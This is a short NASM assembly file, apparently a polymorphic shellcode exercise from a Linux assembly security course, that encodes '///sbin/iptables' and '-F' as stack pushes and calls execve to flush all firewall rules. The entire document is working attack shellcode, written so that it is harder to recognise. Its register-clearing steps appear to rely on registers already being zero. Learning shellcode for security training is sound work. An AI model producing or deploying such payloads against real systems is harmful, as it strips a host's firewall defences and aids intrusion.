; Filename: shellcode3.poly.nasm
; Author:  SLAE-935
;
; Purpose: iptables --flush

section .text

    global _start
 
_start:
    shr eax, 16
    push eax
    push word 0x462d
    push esp
    pop esi
    push eax
    push 0x73656c62
    push 0x61747069
    push 0x2f6e6962
    push 0x732f2f2f
    push esp
    pop ebx
    push eax
    push esi
    push ebx
    mov ecx, esp
    shl edx, 16
    push byte 11
    pop eax
    int 0x80